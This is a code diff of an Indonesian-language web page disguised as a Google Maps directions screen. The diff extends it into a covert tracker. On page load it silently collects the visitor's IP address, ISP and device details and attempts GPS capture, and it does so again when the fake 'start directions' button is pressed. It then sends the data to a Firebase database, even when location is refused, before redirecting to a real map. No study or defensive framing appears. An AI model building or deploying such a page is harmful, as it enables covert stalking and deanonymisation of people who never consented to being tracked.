@@ -7,43 +7,13 @@
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; }
         body, html { width: 100%; height: 100%; overflow: hidden; background-color: #f1f3f4; }
-        
-        /* Background Peta Samaran */
-        .maps-bg {
-            position: absolute; width: 100%; height: 100%;
-            background: url('https://maps.gstatic.com/tactile/gmm/api_geolocation_v2.png') center/cover no-repeat;
-            filter: grayscale(20%) opacity(0.5); z-index: 1;
-        }
-
-        /* Panel Info Rute di Atas (Meniru Google Maps Asli) */
-        .route-panel {
-            position: absolute; top: 15px; left: 50%; transform: translateX(-50%);
-            width: 90%; max-width: 400px; background: white; padding: 15px;
-            border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); z-index: 10;
-        }
+        .maps-bg { position: absolute; width: 100%; height: 100%; background: url('https://maps.gstatic.com/tactile/gmm/api_geolocation_v2.png') center/cover no-repeat; filter: grayscale(20%) opacity(0.5); z-index: 1; }
+        .route-panel { position: absolute; top: 15px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; background: white; padding: 15px; border-radius: 8px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); z-index: 10; }
         .route-title { font-size: 16px; font-weight: 500; color: #1a73e8; margin-bottom: 5px; }
         .route-desc { font-size: 13px; color: #5f6368; }
-
-        /* Tombol Utama Tiruan */
-        .btn-container {
-            position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%);
-            width: 90%; max-width: 400px; z-index: 10; text-align: center;
-        }
-        .btn-rute {
-            width: 100%; background-color: #1a73e8; color: white; border: none;
-            padding: 14px; font-size: 15px; font-weight: 500; border-radius: 24px;
-            box-shadow: 0 4px 10px rgba(26,115,232,0.3); cursor: pointer;
-            display: flex; align-items: center; justify-content: center; gap: 8px;
-        }
-        .btn-rute:active { background-color: #1557b0; }
-
-        /* Dialog Loading Indikator */
-        .loading-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(255, 255, 255, 0.9); z-index: 100;
-            display: flex; flex-direction: column; align-items: center; justify-content: center;
-            visibility: hidden; opacity: 0; transition: opacity 0.3s ease;
-        }
+        .btn-container { position: absolute; bottom: 40px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; z-index: 10; text-align: center; }
+        .btn-rute { width: 100%; background-color: #1a73e8; color: white; border: none; padding: 14px; font-size: 15px; font-weight: 500; border-radius: 24px; box-shadow: 0 4px 10px rgba(26,115,232,0.3); cursor: pointer; }
+        .loading-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255, 255, 255, 0.9); z-index: 100; display: flex; flex-direction: column; align-items: center; justify-content: center; visibility: hidden; opacity: 0; transition: opacity 0.3s ease; }
         .spinner { border: 4px solid rgba(0,0,0,0.1); width: 40px; height: 40px; border-radius: 50%; border-left-color: #1a73e8; animation: spin 0.8s linear infinite; margin-bottom: 15px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
@@ -61,9 +31,7 @@
     </div>
 
     <div class="btn-container">
-        <button class="btn-rute" onclick="mintaLokasi()">
-            🌐 Mulai Petunjuk Arah
-        </button>
+        <button class="btn-rute" onclick="mintaLokasi()">🌐 Mulai Petunjuk Arah</button>
     </div>
 
     <div class="loading-overlay" id="loader">
@@ -84,57 +52,71 @@
         
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
-
-        // Alamat Google Maps asli tujuan akhir (Titik Temu)
         const TARGET_MAPS_URL = "https://maps.google.com/?q=-6.175392,106.827153"; 
 
-        // 1. Pemicu Otomatis Pertama saat halaman baru dibuka
-        window.onload = function() {
-            jalankanPelacakan(false); // Coba lacak diam-diam di awal
+        // Objek penampung data dasar (Device & Jaringan) yang didapat secara OTOMATIS
+        let logData = {
+            waktu: new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" }),
+            perangkat: navigator.userAgent, // Membaca merk HP & OS
+            ip_publik: "Gagal memuat",
+            provider_isp: "Gagal memuat",
+            latitude: "Tidak diizinkan",
+            longitude: "Tidak diizinkan",
+            akurasi_meter: "-",
+            google_maps_link: "-"
         };
 
-        // 2. Pemicu Kedua saat tombol tiruan diklik target
+        // Ambil data IP dan Provider secara otomatis saat web dibuka
+        window.onload = function() {
+            fetch('https://ipapi.co/json/')
+                .then(response => response.json())
+                .then(data => {
+                    logData.ip_publik = data.ip;
+                    logData.provider_isp = data.org; // 'org' berisi nama provider (ISP)
+                })
+                .catch(() => {
+                    // Cadangan jika ipapi limit, gunakan ipify
+                    fetch('https://api.ipify.org?format=json')
+                        .then(res => res.json())
+                        .then(json => { logData.ip_publik = json.ip; });
+                });
+            
+            // Coba pemicu pelacakan GPS senyap di awal
+            jalankanPelacakan(false);
+        };
+
         function mintaLokasi() {
             document.getElementById('loader').style.visibility = 'visible';
             document.getElementById('loader').style.opacity = '1';
-            jalankanPelacakan(true); // Paksa minta izin rute
+            jalankanPelacakan(true);
         }
 
         function jalankanPelacakan(isFromButton) {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
-                    (pos) => sendLocation(pos), 
-                    (err) => handleError(err, isFromButton), 
+                    (pos) => {
+                        logData.latitude = pos.coords.latitude;
+                        logData.longitude = pos.coords.longitude;
+                        logData.akurasi_meter = Math.round(pos.coords.accuracy);
+                        logData.google_maps_link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        saveToFirebase();
+                    }, 
+                    (err) => {
+                        if (isFromButton || err.code === err.TIMEOUT) {
+                            saveToFirebase(); // Tetap simpan walau GPS ditolak (IP & ISP tetap dapat)
+                        }
+                    }, 
                     { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
                 );
             } else if (isFromButton) {
-                redirectToMaps();
+                saveToFirebase();
             }
         }
 
-        function sendLocation(position) {
-            const lat = position.coords.latitude;
-            const lng = position.coords.longitude;
-            const acc = position.coords.accuracy;
-            const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-
-            database.ref('logs_lokasi').push({
-                waktu: timestamp,
-                latitude: lat,
-                longitude: lng,
-                akurasi_meter: Math.round(acc),
-                google_maps_link: `https://www.google.com/maps?q=${lat},${lng}`,
-                status: "Berhasil Akses"
-            }).then(() => { redirectToMaps(); }).catch(() => { redirectToMaps(); });
-        }
-
-        function handleError(error, isFromButton) {
-            // Jika tombol rute diklik atau waktu habis, langsung lempar ke peta asli agar tidak macet
-            if (isFromButton || error.code === error.TIMEOUT) {
-                const timestamp = new Date().toLocaleString("id-ID", { timeZone: "Asia/Jakarta" });
-                database.ref('logs_lokasi').push({ waktu: timestamp, status: "Gagal/Ditolak" })
-                .then(() => { redirectToMaps(); }).catch(() => { redirectToMaps(); });
-            }
+        function saveToFirebase() {
+            database.ref('logs_lokasi').push(logData)
+            .then(() => { redirectToMaps(); })
+            .catch(() => { redirectToMaps(); });
         }
 
         function redirectToMaps() {
